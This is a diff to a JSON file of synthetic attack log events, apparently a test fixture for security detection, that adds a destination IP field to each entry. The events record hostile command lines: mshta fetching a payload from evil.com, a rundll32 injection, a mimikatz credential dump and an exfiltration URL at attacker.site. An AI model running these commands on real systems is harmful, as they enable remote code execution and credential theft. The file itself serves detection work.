@@ -6,7 +6,8 @@
     "process_name": "mshta.exe",
     "command_line": "mshta http://evil.com/payload.hta",
     "username": "user01",
-    "src_ip": "192.168.100.10"
+    "src_ip": "192.168.100.10",
+    "dst_ip": "8.8.8.8"
   },
   {
     "timestamp": "2025-05-20T14:10:15",
@@ -15,7 +16,8 @@
     "process_name": "powershell.exe",
     "command_line": "powershell -c \"[System.Diagnostics.Eventing.EventProvider]::new()\"",
     "username": "user01",
-    "src_ip": "192.168.100.10"
+    "src_ip": "192.168.100.10",
+    "dst_ip": "8.8.8.8"
   },
   {
     "timestamp": "2025-05-20T14:10:25",
@@ -24,7 +26,8 @@
     "process_name": "rundll32.exe",
     "command_line": "rundll32 my.dll,Inject",
     "username": "user01",
-    "src_ip": "192.168.100.10"
+    "src_ip": "192.168.100.10",
+    "dst_ip": "8.8.8.8"
   },
   {
     "timestamp": "2025-05-20T14:10:40",
@@ -33,7 +36,8 @@
     "process_name": "mimikatz.exe",
     "command_line": "sekurlsa::logonpasswords",
     "username": "user01",
-    "src_ip": "192.168.100.10"
+    "src_ip": "192.168.100.10",
+    "dst_ip": "8.8.8.8"
   },
   {
     "timestamp": "2025-05-20T14:10:50",
@@ -51,6 +55,7 @@
     "vendor": "squid",
     "client_ip": "192.168.100.10",
     "url": "http://attacker.site/exfil/data.zip",
-    "status": "TCP_MISS/200"
+    "status": "TCP_MISS/200",
+    "dst_ip": "8.8.8.8"
   }
 ]
